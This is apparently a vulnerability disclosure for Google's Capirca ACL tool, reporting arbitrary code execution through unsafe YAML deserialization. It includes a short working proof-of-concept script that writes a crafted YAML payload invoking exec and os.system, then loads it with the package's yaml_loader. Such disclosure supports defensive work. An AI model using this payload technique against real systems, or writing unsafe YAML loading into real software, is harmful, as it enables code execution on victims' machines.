# Description

**Capirca** is a tool designed to utilize common definitions of networks, services and high-level policy files to facilitate the development and manipulation of network access control lists (ACLs) for various platforms. It was developed by Google for internal use, and is now open source.

This package is vulnerable to Arbitrary code execution via Insecure YAML deserialization due to the use of a known vulnerable function **load()** in **yaml**. <br>
repo: https://github.com/google/capirca

# Proof of Concept

```python
#!/usr/bin/env python3

import capirca.utils.config as utils

payload = '''
!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('calc.exe')"
'''
open('pwn.yml', 'w+').write(payload)

utils.yaml_loader('pwn.yml')
print("pwned 🏴")
```

* clone and install https://github.com/google/capirca.git using `setup.py`
* `python3 exploit.py`
